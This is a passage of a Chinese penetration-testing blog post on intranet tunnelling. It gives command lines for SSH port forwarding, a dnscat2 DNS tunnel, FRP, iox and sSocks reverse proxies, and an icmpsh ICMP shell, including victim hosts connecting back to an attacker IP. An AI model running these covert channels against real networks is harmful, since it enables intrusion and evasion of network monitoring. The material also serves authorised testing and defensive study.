+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -L 8866:192.168.10.3:23 -fN 192.168.10.2
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108224514.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108224514.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108224514.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108224514.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108224514.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108224514.png-water_print" /></p>
+<h4 id="322-远程端口转发">3.2.2 远程端口转发</h4>
+<p>在远程主机上开启端口流量转发功能</p>
+<p>例如：在堡垒机上执行（边界主机上执行回连）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -R 8866:192.168.10.3:23 -fN 192.168.10.1
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225357.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225357.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225357.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225357.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225357.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225357.png-water_print" /></p>
+<h4 id="323-动态转发---socket">3.2.3 动态转发 - Socket</h4>
+<p>在本地主机上开启流量动态转发功能，并配置代理</p>
+<p>例如：在入侵者主机上执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -D <span class="m">1100</span> -fN 192.168.10.2
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225846.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225846.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225846.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225846.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225846.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210108225846.png-water_print" /></p>
+<h3 id="33-dns-隧道">3.3 DNS 隧道</h3>
+<p>工具 <a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener noreffer">DNScat2</a></p>
+<p>编译好的各种版本：<a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener noreffer">https://downloads.skullsecurity.org/dnscat2/</a></p>
+<h4 id="331-配置解析记录">3.3.1 配置解析记录</h4>
+<p>DNS 解析记录中添加一条 A 记录，名称为 <code>ns1</code> 值为 VPS IP 地址</p>
+<p>再添加一条 NS 记录，名称为任意一个子域名，指向地址为 <code>ns1.yourdomain.com</code></p>
+<h4 id="332-安装-dnscat2-服务端">3.3.2 安装 dnscat2 服务端</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">apt-get install gem
+apt-get install ruby-dev
+apt-get install libpq-dev
+apt-get install ruby-bundler
+apt-get install git
+git clone https://github.com/iagox86/dnscat2
+bundle install
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="333-启动服务端">3.3.3 启动服务端</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ruby ./dnscat2.rb dnscat.yuming.com -e open -c mima --no-cache
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="334-启动客户端">3.3.4 启动客户端</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 测试能否通信</span>
+dnscat-client.exe -ping dnscat.yuming.com
+
+<span class="c1"># 连接</span>
+dnscat-client.exe --dns <span class="nv">domain</span><span class="o">=</span>dnscat.yuming.com -secret mima
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="4-传输层">4 传输层</h2>
+<p>SOCKS4 支持 telnet、FTP、HTTP 等 TCP 协议</p>
+<p>SOCKS5 支持 TCP 与 UDP，并支持安全认证方案</p>
+<h3 id="41-frp">4.1 FRP</h3>
+<p>frp 采用 Golang 编写，支持跨平台，仅需下载对应平台的二进制文件即可执行。工具地址：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener noreffer">https://github.com/fatedier/frp</a></p>
+<p>编写配置文件，先通过 <code>./frps -c ./frps.ini</code> 启动服务端，再通过 <code>./frpc -c ./frpc.ini</code> 启动客户端。</p>
+<p>服务端部署在我们具有公网 IP 的服务器上，客户端放在我们拿到权限的跳板服务器上，双端都需要对配置文件进行配置。</p>
+<h4 id="411-服务端">4.1.1 服务端</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[common]
+# frp 服务端端口
+bind_port = 7000
+# 仪表盘端口
+dashboard_port = 8888
+# frp服务端密码
+token = 123456
+# 仪表盘默认账号密码
+dashboard_user = admin
+dashboard_pwd = admin
+</code></pre></td></tr></table>
+</div>
+</div><p>启动 FRP：<code>frps -c frps.ini</code></p>
+<h4 id="412-客户端">4.1.2 客户端</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[common]
+server_addr = VPS IP
+server_port = 7000
+# 与 vps 保持一致
+token = 123456
+[ssh]
+type = tcp
+local_ip = 127.0.0.1
+local_port = 22
+remote_port = 7000
+use_encryption = true
+use_compression = true
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="42-iox">4.2 iox</h3>
+<p>iox 是一个端口转发 &amp; 内网代理工具，功能类似于<code>lcx</code>/<code>ew</code>，但是比它们更好。</p>
+<p>工具地址：<a href="https://github.com/EddieIvan01/iox" target="_blank" rel="noopener noreffer">https://github.com/EddieIvan01/iox</a></p>
+<h4 id="421-端口转发">4.2.1 端口转发</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 端口转发 - 从本地 8888 转到 9999</span>
+./iox fwd -l <span class="m">8888</span> -l <span class="m">9999</span>
+
+<span class="c1"># 端口转发 - 从本地 8888，把流量转发到 1.1.1.1:9999</span>
+./iox fwd -l <span class="m">8888</span> -r 1.1.1.1:9999
+
+<span class="c1"># 连接 1.1.1.1:8888 和 1.1.1.1:9999, 在两个连接间转发</span>
+./iox fwd -r 1.1.1.1:8888 -r 1.1.1.1:9999
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="422-代理">4.2.2 代理</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 在本地 0.0.0.0:1080 启动 Socks5 服务 - 正向代理</span>
+./iox proxy -l <span class="m">1080</span>
+
+
+<span class="c1"># 反向代理</span>
+<span class="c1"># 在被控机开启 Socks5 服务，将服务转发到公网 VPS</span>
+./iox proxy -r 1.1.1.1:9999
+
+<span class="c1"># 在 VPS 上转发 0.0.0.0:9999 到 0.0.0.0:1080</span>
+<span class="c1"># 你必须将两条命令成对使用，因为它内部包含了一个简单的协议来控制回连</span>
+./iox proxy -l <span class="m">9999</span> -l <span class="m">1080</span>       // 注意，这两个端口是有顺序的
+
+<span class="c1"># 接着连接内网主机</span>
+<span class="c1"># socks5://1.1.1.1:1080</span>
+proxychains rdesktop 192.168.0.100:3389
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="43-ssocks">4.3 sSocks</h3>
+<p>sSocks 是一个 socks 代理工具套装，可用来开启 socks 代理服务，支持 socks5 验证，支持 IPV6 和 UDP，并提供反向 socks 代理服务，即将远程计算机作为 socks 代理服务端，反弹回本地，极大方便内网的渗透测试。</p>
+<p>工具地址：<a href="http://sourceforge.net/projects/ssocks/" target="_blank" rel="noopener noreffer">http://sourceforge.net/projects/ssocks/</a></p>
+<ul>
+<li>正向代理</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">./ssocksd --bind 192.168.172.131 --port <span class="m">1080</span>
+</code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>反向代理</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 攻击者机器监听 6020 端口转发到 6010</span>
+./rcsocks -l <span class="m">6020</span> -p <span class="m">6010</span> -vv
+
+<span class="c1"># 受害者反向连接代理主机 6010 端口</span>
+./rssocks -s 攻击者IP:6010 -vv
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="5-网络层">5 网络层</h2>
+<h3 id="51-icmp-tunnel">5.1 ICMP Tunnel</h3>
+<p>工具名称：<a href="https://github.com/inquisb/icmpsh" target="_blank" rel="noopener noreffer">ICMPSH</a></p>
+<h4 id="511-服务端">5.1.1 服务端</h4>
+<p>服务端首先需要关闭 ICMP 回显：<code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p>
+<p>安装服务端：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">apt-get install python-impacket
+python icmpsh_m.py 本机IP 目标机器公网IP
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="512-客户端">5.1.2 客户端</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">icmpsh.exe -t 目标IP -d <span class="m">500</span> -b <span class="m">30</span> -s <span class="m">128</span>
+</code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2020-08-15</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/" data-title="内网隧道穿透"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/" data-title="内网隧道穿透"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2020/08/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E7%A9%BF%E9%80%8F/" data-title="内网隧道穿透"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%9F%9F%E5%AE%89%E5%85%A8/">域安全</a>,&nbsp;<a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/" class="prev" rel="prev" title="Potato 家族提权分析"><i class="fas fa-angle-left fa-fw"></i>Potato 家族提权分析</a>
+            <a href="/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" class="next" rel="next" title="HTTP 请求走私">HTTP 请求走私<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
